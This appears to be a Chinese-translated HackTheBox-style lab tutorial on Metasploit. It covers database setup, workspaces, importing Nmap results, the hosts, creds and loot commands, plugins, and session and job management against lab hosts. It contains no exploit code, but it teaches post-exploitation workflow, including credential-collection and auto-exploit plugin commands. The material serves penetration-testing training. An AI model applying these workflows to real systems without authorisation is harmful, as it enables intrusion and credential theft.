vnswer77@htb[/htb]$ sudo service postgresql status

● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago
    Process: 2147 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 2147 (code=exited, status=0/SUCCESS)
        CPU: 1ms

May 06 14:51:30 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...
May 06 14:51:30 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.
```

#### 启动 PostgreSQL

 启动 PostgreSQL

```shell-session
vnswer77@htb[/htb]$ sudo systemctl start postgresql
```

启动 PostgreSQL 后，我们需要创建并初始化 MSF 数据库`msfdb init`。

#### MSF - 启动数据库

 MSF - 启动数据库

```shell-session
vnswer77@htb[/htb]$ sudo msfdb init

[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
rake aborted!
NoMethodError: undefined method `without' for #<Bundler::Settings:0x000055dddcf8cba8>
Did you mean? with_options

<SNIP>
```

如果 Metasploit 不是最新的，有时会发生错误。这种导致错误的差异可能有多种原因。首先，通常它有助于再次更新 Metasploit ( `apt update`) 来解决这个问题。然后我们可以尝试重新初始化 MSF 数据库。

 MSF - 启动数据库

```shell-session
vnswer77@htb[/htb]$ sudo msfdb init

[i] Database already started
[i] The database appears to be already configured, skipping initialization
```

如果初始化被跳过并且 Metasploit 告诉我们数据库已经配置好，我们可以重新检查数据库的状态。

 MSF - 启动数据库

```shell-session
vnswer77@htb[/htb]$ sudo msfdb status

● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Mon 2022-05-09 15:19:57 BST; 35min ago
    Process: 2476 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 2476 (code=exited, status=0/SUCCESS)
        CPU: 1ms

May 09 15:19:57 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...
May 09 15:19:57 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.

COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
postgres 2458 postgres    5u  IPv6  34336      0t0  TCP localhost:5432 (LISTEN)
postgres 2458 postgres    6u  IPv4  34337      0t0  TCP localhost:5432 (LISTEN)

UID          PID    PPID  C STIME TTY      STAT   TIME CMD
postgres    2458       1  0 15:19 ?        Ss     0:00 /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c con

[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)
```

如果这个错误没有出现，这通常发生在全新安装 Metasploit 之后，那么我们将在初始化数据库时看到以下内容：

 MSF - 启动数据库

```shell-session
vnswer77@htb[/htb]$ sudo msfdb init

[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

数据库初始化完成后，我们可以`msfconsole`同时启动并连接到创建的数据库。

#### MSF - 连接到启动的数据库

 MSF - 连接到启动的数据库

```shell-session
vnswer77@htb[/htb]$ sudo msfdb run

[i] Database already started
                                                  
         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.1.39-dev                          ]
+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

msf6>
```

但是，如果我们已经配置了数据库并且无法将密码更改为 MSF 用户名，请继续执行以下命令：

#### MSF - 重新启动数据库

 MSF - 重新启动数据库

```shell-session
vnswer77@htb[/htb]$ msfdb reinit
vnswer77@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
vnswer77@htb[/htb]$ sudo service postgresql restart
vnswer77@htb[/htb]$ msfconsole -q

msf6 > db_status

[*] Connected to msf. Connection type: PostgreSQL.
```

现在，我们可以开始了。它还`msfconsole`为数据库提供集成帮助。这为我们提供了与数据库交互和使用数据库的良好概述。

#### MSF - 数据库选项

 MSF - 数据库选项

```shell-session
msf6 > help database

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
	

msf6 > db_status

[*] Connected to msf. Connection type: postgresql.
```

------

## 使用数据库

在数据库的帮助下，我们可以管理我们分析过的许多不同的类别和主机。或者，我们使用 Metasploit 与之交互的有关它们的信息。这些数据库可以导出和导入。当我们有大量的主机列表、战利品、注释和这些主机的存储漏洞时，这尤其有用。确认数据库连接成功后，我们就可以组织我们的`Workspaces`.

#### 工作区

我们可以`Workspaces`像考虑项目中的文件夹一样考虑。我们可以按 IP、子网、网络或域隔离不同的扫描结果、主机和提取的信息。

要查看当前工作区列表，请使用`workspace`命令。在命令后添加`-a`or开关，后跟工作空间的名称，将把工作空间或该工作空间添加到数据库中。`-d``add``delete`

 工作区

```shell-session
msf6 > workspace

* default
```

请注意，默认工作区已`default`根据`*`符号命名并且当前正在使用中。键入`workspace [name]`命令以切换当前使用的工作区。回顾我们的示例，让我们为此评估创建一个工作区并选择它。

 工作区

```shell-session
msf6 > workspace -a Target_1

[*] Added workspace: Target_1
[*] Workspace: Target_1


msf6 > workspace Target_1 

[*] Workspace: Target_1


msf6 > workspace

  default
* Target_1
```

要查看我们还可以使用 Workspaces 做什么，我们可以使用`workspace -h`与 Workspaces 相关的帮助菜单的命令。

 工作区

```shell-session
msf6 > workspace -h

Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r     Rename workspace
    workspace -h               Show this help information
```

------

## 导入扫描结果

接下来，让我们假设我们想要将`Nmap scan`主机的一个导入到我们的数据库的工作区中，以便更好地了解目标。我们可以`db_import`为此使用命令。导入完成后，我们可以使用`hosts`和`services`命令检查数据库中主机信息的存在。请注意，`.xml`文件类型首选`db_import`.

#### 存储 Nmap 扫描

```shell-session
vnswer77@htb[/htb]$ cat Target.nmap

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC
Nmap scan report for 10.10.10.40
Host is up (0.017s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.81 seconds
```

#### 导入扫描结果

```shell-session
msf6 > db_import Target.xml

[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.9'
[*] Importing host 10.10.10.40
[*] Successfully imported ~/Target.xml


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.40             Unknown                    device         


msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```

## 在 MSF 控制台中使用 Nmap

或者，我们可以直接从 msfconsole 使用 Nmap！要直接从控制台扫描而无需后台或退出进程，请使用命令`db_nmap`。

#### 无国界医生-Nmap

```shell-session
msf6 > db_nmap -sV -sS 10.10.10.8

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 21:04 UTC
[*] Nmap: Nmap scan report for 10.10.10.8
[*] Nmap: Host is up (0.016s latency).
[*] Nmap: Not shown: 999 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/TCP open  http    HttpFileServer httpd 2.3
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.8              Unknown                    device         
10.10.10.40             Unknown                    device         


msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```

## 数据备份

会话结束后，如果 PostgreSQL 服务出现任何问题，请务必备份我们的数据。为此，请使用`db_export`命令。

#### MSF - 数据库导出

```shell-session
msf6 > db_export -h

Usage:
    db_export -f <format> [filename]
    Format can be one of: xml, pwdump
[-] No output file was specified


msf6 > db_export -f xml backup.xml

[*] Starting export of workspace default to backup.xml [ xml ]...
[*] Finished export of workspace default to backup.xml [ xml ]...
```

以后需要时可以将此数据导回 msfconsole。`hosts`其他与数据保留相关的命令是、`services`、`creds`和命令的扩展使用`loot`。

## 主持

该`hosts`命令显示一个数据库表，该表自动填充了主机地址、主机名以及我们在扫描和交互过程中找到的有关这些信息的其他信息。例如，假设`msfconsole`与可以执行服务和操作系统检测的扫描仪插件链接。在这种情况下，一旦通过 msfconsole 完成扫描，该信息就会自动出现在表中。同样，Nessus、NexPose 或 Nmap 等工具将在这些情况下为我们提供帮助。

主机也可以手动添加为该表中的单独条目。添加我们的自定义主机后，我们还可以组织表格的格式和结构、添加评论、更改现有信息等等。

#### MSF - 存储主机

```shell-session
msf6 > hosts -h

Usage: hosts [ options ] [addr1 addr2 ...]

OPTIONS:
  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c <col1,col2>    Only show the given columns (see list below)
  -C <col1,col2>    Only show the given columns until the next restart (see list below)
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o <file>         Send output to a file in CSV format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts

Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags
```

## 服务

该`services`命令的功能与前一个命令相同。它包含一个表格，其中包含有关在扫描或交互过程中发现的服务的描述和信息。与上面的命令一样，这里的条目是高度可定制的。

#### MSF - 主机的存储服务

```shell-session
msf6 > services -h

Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c <col1,col2>    Only show the given columns
  -h,--help         Show this help information
  -s <name>         Name of the service to add
  -p <port>         Search for a list of ports
  -r <protocol>     Protocol type of the service being added [tcp|udp]
  -u,--up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -U,--update       Update data for existing service

Available columns: created_at, info, name, port, proto, state, updated_at
```

## 证书

该`creds`命令允许您可视化在与目标主机交互期间收集的凭据。我们还可以手动添加凭据，将现有凭据与端口规范匹配，添加描述等。

#### MSF - 存储凭证

```shell-session
msf6 > creds -h

With no sub-command, list credentials. If an address range is
given, show only credentials with logins on hosts within that
range.

Usage - Listing credentials:
  creds [filter options] [address range]

Usage - Adding credentials:
  creds add uses the following named parameters.
    user      :  Public, usually a username
    password  :  Private, private_type Password.
    ntlm      :  Private, private_type NTLM Hash.
    Postgres  :  Private, private_type Postgres MD5
    ssh-key   :  Private, private_type SSH key, must be a file path.
    hash      :  Private, private_type Nonreplayable hash
    jtr       :  Private, private_type John the Ripper hash type.
    realm     :  Realm, 
    realm-type:  Realm, realm_type (domain db2db sid pgdb rsync wildcard), defaults to domain.

Examples: Adding
   # Add a user, password and realm
   creds add user:admin password:notpassword realm:workgroup
   # Add a user and password
   creds add user:guest password:'guest password'
   # Add a password
   creds add password:'password without username'
   # Add a user with an NTLMHash
   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   # Add a NTLMHash
   creds add ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   # Add a Postgres MD5
   creds add user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860
   # Add a user with an SSH key
   creds add user:sshadmin ssh-key:/path/to/id_rsa
   # Add a user and a NonReplayableHash
   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5
   # Add a NonReplayableHash
   creds add hash:d19c32489b870735b5f587d76b934283

General options
  -h,--help             Show this help information
  -o <file>             Send output to a file in csv/jtr (john the ripper) format.
                        If the file name ends in '.jtr', that format will be used.
                        If file name ends in '.hcat', the hashcat format will be used.
                        CSV by default.
  -d,--delete           Delete one or more credentials

Filter options for listing
  -P,--password <text>  List passwords that match this text
  -p,--port <portspec>  List creds with logins on services matching this port spec
  -s <svc names>        List creds matching comma-separated service names
  -u,--user <text>      List users that match this text
  -t,--type <type>      List creds that match the following types: password,ntlm,hash
  -O,--origins <IP>     List creds that match these origins
  -R,--rhosts           Set RHOSTS from the results of the search
  -v,--verbose          Don't truncate long password hashes

Examples, John the Ripper hash types:
  Operating Systems (starts with)
    Blowfish ($2a$)   : bf
    BSDi     (_)      : bsdi
    DES               : des,crypt
    MD5      ($1$)    : md5
    SHA256   ($5$)    : sha256,crypt
    SHA512   ($6$)    : sha512,crypt
  Databases
    MSSQL             : mssql
    MSSQL 2005        : mssql05
    MSSQL 2012/2014   : mssql12
    MySQL < 4.1       : mysql
    MySQL >= 4.1      : mysql-sha1
    Oracle            : des,oracle
    Oracle 11         : raw-sha1,oracle11
    Oracle 11 (H type): dynamic_1506
    Oracle 12c        : oracle12c
    Postgres          : postgres,raw-md5

Examples, listing:
  creds               # Default, returns all credentials
  creds 1.2.3.4/24    # Return credentials with logins in this range
  creds -O 1.2.3.4/24 # Return credentials with origins in this range
  creds -p 22-25,445  # nmap port specification
  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services
  creds -t NTLM       # All NTLM creds
  creds -j md5        # All John the Ripper hash type MD5 creds

Example, deleting:
  # Delete all SMB credentials
  creds -d -s smb
```

## 抢劫

该`loot`命令与上面的命令结合使用，为您提供拥有的服务和用户的一目了然的列表。在这种情况下，战利品指的是来自不同系统类型的哈希转储，即哈希、密码、影子等。

#### MSF-- 存储战利品

 MSF-- 存储战利品

```shell-session
msf6 > loot -h

Usage: loot [options]
 Info: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t <type1,type2>  Search for a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by
```

## 插件



插件是第三方已经发布的现成软件，并已批准 Metasploit 的创建者将他们的软件集成到框架中。这些可以代表免费使用但功能有限的商业产品`Community Edition`，或者它们可以是由个人开发的个人项目。

插件的使用使渗透测试人员的生活更加轻松，将知名软件的功能带入`msfconsole`Metasploit Pro 环境。以前，我们需要在不同的软件之间循环导入和导出结果，一遍又一遍地设置选项和参数，现在，通过使用插件，msfconsole 会自动将所有内容记录到我们正在使用的数据库以及主机、服务和漏洞一目了然供用户使用。[插件](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Plugin)直接与 API 一起工作，可用于操作整个框架。它们可用于自动执行重复性任务、向 中添加新命令`msfconsole`以及扩展已经很强大的框架。

### 使用插件

要开始使用插件，我们需要确保它安装在我们机器上的正确目录中。导航到`/usr/share/metasploit-framework/plugins`，这是每个新安装的默认目录`msfconsole`，应该向我们展示我们有哪些可用的插件：

 

```shell-session
vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/plugins

aggregator.rb      beholder.rb        event_tester.rb  komand.rb     msfd.rb    nexpose.rb   request.rb  session_notifier.rb  sounds.rb  token_adduser.rb  wmap.rb
alias.rb           db_credcollect.rb  ffautoregen.rb   lab.rb        msgrpc.rb  openvas.rb   rssfeed.rb  session_tagger.rb    sqlmap.rb  token_hunter.rb
auto_add_route.rb  db_tracker.rb      ips_filter.rb    libnotify.rb  nessus.rb  pcap_log.rb  sample.rb   socket_logger.rb     thread.rb  wiki.rb
```

如果在此处找到该插件，我们可以在内部启动它`msfconsole`，然后会看到该特定插件的问候输出，表明它已成功加载并可以使用了：

### MSF - 加载 Nessus

```shell-session
msf6 > load nessus

[*] Nessus Bridge for Metasploit
[*] Type nessus_help for a command listing
[*] Successfully loaded Plugin: Nessus


msf6 > nessus_help

Command                     Help Text
-------                     ---------
Generic Commands            
-----------------           -----------------
nessus_connect              Connect to a Nessus server
nessus_logout               Logout from the Nessus server
nessus_login                Login into the connected Nessus server with a different username and 

<SNIP>

nessus_user_del             Delete a Nessus User
nessus_user_passwd          Change Nessus Users Password
                            
Policy Commands             
-----------------           -----------------
nessus_policy_list          List all polciies
nessus_policy_del           Delete a policy
```

如果插件安装不正确，我们将在尝试加载时收到以下错误。

 MSF - 加载 Nessus

```shell-session
msf6 > load Plugin_That_Does_Not_Exist

[-] Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb: cannot load such file -- /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb
```

要开始使用该插件，请开始在该特定插件的帮助菜单中发出我们可用的命令。每个跨平台集成都为我们提供了一组独特的交互，我们可以在评估期间使用这些交互，因此在使用它们之前仔细阅读每一个交互是很有帮助的，这样可以最大限度地利用它们。

### 安装新插件

Parrot OS 发行版的每次更新都会安装新的、更受欢迎的插件，因为它们由其制造商向公众推出，收集在 Parrot 更新存储库中。`/usr/share/metasploit-framework/plugins`要安装未包含在发行版新更新中的新自定义插件，我们可以获取制造商页面上提供的 .rb 文件，并将其放置在具有适当权限的文件夹中。

例如，让我们尝试安装[DarkOperator 的 Metasploit-Plugins](https://github.com/darkoperator/Metasploit-Plugins.git)。然后，按照上面的链接，我们得到几个 Ruby ( `.rb`) 文件，我们可以直接将它们放在上面提到的文件夹中。

### 下载 MSF 插件

 

```shell-session
vnswer77@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins
vnswer77@htb[/htb]$ ls Metasploit-Plugins

aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb
alias.rb           komand.rb      pentest.rb           thread.rb
auto_add_route.rb  lab.rb         request.rb           token_adduser.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb
db_credcollect.rb  msfd.rb        sample.rb            twitt.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
growl.rb           openvas.rb     sounds.rb
```

这里我们可以以插件`pentest.rb`为例，复制到`/usr/share/metasploit-framework/plugins`.

#### MSF - 将插件复制到 MSF

 MSF - 将插件复制到 MSF

```shell-session
vnswer77@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

然后，`msfconsole`通过运行命令启动并检查插件的安装`load`。加载插件后， at`help menu`会`msfconsole`自动扩展附加功能。

#### MSF - 加载插件

 MSF - 加载插件

```shell-session
vnswer77@htb[/htb]$ msfconsole -q

msf6 > load pentest

       ___         _          _     ___ _           _
      | _ \___ _ _| |_ ___ __| |_  | _ \ |_  _ __ _(_)_ _
      |  _/ -_) ' \  _/ -_|_-<  _| |  _/ | || / _` | | ' \ 
      |_| \___|_||_\__\___/__/\__| |_| |_|\_,_\__, |_|_||_|
                                              |___/
      
Version 1.6
Pentest Plugin loaded.
by Carlos Perez (carlos_perez[at]darkoperator.com)
[*] Successfully loaded plugin: pentest


msf6 > help

Tradecraft Commands
===================

    Command          Description
    -------          -----------
    check_footprint  Checks the possible footprint of a post module on a target system.


auto_exploit Commands
=====================

    Command           Description
    -------           -----------
    show_client_side  Show matched client side exploits from data imported from vuln scanners.
    vuln_exploit      Runs exploits based on data imported from vuln scanners.


Discovery Commands
==================

    Command                 Description
    -------                 -----------
    discover_db             Run discovery modules against current hosts in the database.
    network_discover        Performs a port-scan and enumeration of services found for non pivot networks.
    pivot_network_discover  Performs enumeration of networks available to a specified Meterpreter session.
    show_session_networks   Enumerate the networks one could pivot thru Meterpreter in the active sessions.


Project Commands
================

    Command       Description
    -------       -----------
    project       Command for managing projects.


Postauto Commands
=================

    Command             Description
    -------             -----------
    app_creds           Run application password collection modules against specified sessions.
    get_lhost           List local IP addresses that can be used for LHOST.
    multi_cmd           Run shell command against several sessions
    multi_meter_cmd     Run a Meterpreter Console Command against specified sessions.
    multi_meter_cmd_rc  Run resource file with Meterpreter Console Commands against specified sessions.
    multi_post          Run a post module against specified sessions.
    multi_post_rc       Run resource file with post modules and options against specified sessions.
    sys_creds           Run system password collection modules against specified sessions.

<SNIP>
```

许多人为 Metasploit 框架编写了许多不同的插件。它们都有特定的目的，在熟悉它们之后可以极大地帮助我们节省时间。查看下面的流行插件列表：

|                                                              |                                                              |                                                              |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| [nMap（预装）](https://nmap.org/)                            | [NexPose（预装）](https://sectools.org/tool/nexpose/)        | [Nessus（预装）](https://www.tenable.com/products/nessus)    |
| [Mimikatz（预装 V.1）](http://blog.gentilkiwi.com/mimikatz)  | [Stdapi（预装）](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi) | [电磁炮](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation) |
| [私人](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb) | [隐身（预装）](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/) | [黑暗操作员的](https://github.com/darkoperator/Metasploit-Plugins) |

### 混入

Metasploit 框架是用面向对象的编程语言 Ruby 编写的。`msfconsole`这在使用起来非常出色方面起着重要作用。Mixin 是其中一种特性，在实现时，它可以为脚本的创建者和用户提供很大的灵活性。

Mixin 是充当其他类使用的方法的类，而不必是其他类的父类。因此，将其称为继承而不是包含被认为是不合适的。它们主要用于我们：

1. 想为一个类提供很多可选的功能。
2. 想要为多个类使用一个特定的功能。

大多数 Ruby 编程语言都围绕作为模块的 Mixins 展开。Mixins 的概念是使用 word 实现的`include`，我们将模块名称作为`parameter`. [我们可以在这里](https://en.wikibooks.org/wiki/Metasploit/UsingMixins)阅读更多关于 mixin 的信息。

如果我们刚刚开始使用 Metasploit，我们不应该担心 Mixins 的使用或它们对我们评估的影响。然而，这里提到它们是为了说明 Metasploit 的定制会变得多么复杂。

## Sessions

MSFconsole 可以同时管理多个模块。这是它为用户提供如此多灵活性的众多原因之一。这是通过使用 来完成的`Sessions`，它为您部署的所有模块创建专用的控制接口。

一旦创建了多个会话，我们就可以在它们之间切换并将不同的模块链接到其中一个后台会话以在其上运行或将它们转换为作业。请注意，一旦将会话置于后台，它将继续运行，并且我们与目标主机的连接将持续存在。但是，如果在有效负载运行时出现问题，会话可能会终止，从而导致通信通道中断。

## 使用会话

在 msfconsole 中运行任何可用的漏洞利用或辅助模块时，只要它们形成与目标主机的通信通道，我们就可以将会话置于后台。这可以通过按组合键或在 Meterpreter stages 的情况下`[CTRL] + [Z]`键入命令来完成。`background`这将提示我们一条确认消息。接受提示后，我们将返回到 msfconsole 提示符 ( `msf6 >`) 并立即能够启动不同的模块。

#### 列出活动会话

我们可以使用该`sessions`命令来查看我们当前活动的会话。

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

#### 与会话交互

您可以使用该`sessions -i [no.]`命令打开特定会话。

 与会话交互

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

当我们想在一个已经被利用的系统上运行一个额外的模块时，这特别有用，该系统具有形成的、稳定的通信通道。

这可以通过后台处理我们当前的会话来完成，该会话是由于第一个漏洞利用的成功而形成的，搜索我们希望运行的第二个模块，并且，如果所选模块的类型可能，选择会话号该模块应该运行。这可以从第二个模块的菜单中完成`show options`。

通常，这些模块可以在类别中找到`post`，指的是 Post-Exploitation 模块。此类别中的主要模块原型包括凭据收集器、本地漏洞利用建议器和内部网络扫描器。

------

## 工作

例如，如果我们在特定端口下运行主动攻击并且需要此端口用于不同的模块，我们不能简单地使用终止会话`[CTRL] + [C]`。如果我们这样做，我们会看到该端口仍在使用中，影响我们对新模块的使用。因此，我们需要使用`jobs`命令来查看当前在后台运行的活动任务并终止旧任务以释放端口。

会话中的其他类型的任务也可以转换为作业以在后台无缝运行，即使会话终止或消失也是如此。

#### 查看作业命令帮助菜单

我们可以通过键入 来查看此命令的帮助菜单，就像其他命令一样`jobs -h`。

 查看作业命令帮助菜单

```shell-session
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```

#### 查看漏洞利用命令帮助菜单

当我们运行 exploit 时，我们可以通过键入`exploit -j`. 根据命令的帮助菜单`exploit`，添加`-j`到我们的命令中。而不仅仅是`exploit`or `run`，将“在作业的上下文中运行它”。

 查看漏洞利用命令帮助菜单

```shell-session
msf6 exploit(multi/handler) > exploit -h
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
	
<SNIP
```

#### 将漏洞作为后台作业运行

 将漏洞作为后台作业运行

```shell-session
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

#### 列出正在运行的作业

要列出所有正在运行的作业，我们可以使用`jobs -l`命令。要杀死特定的工作，请查看索引号。作业并使用`kill [index no.]`命令。使用该`jobs -K`命令终止所有正在运行的作业。

 列出正在运行的作业

```shell-session
msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
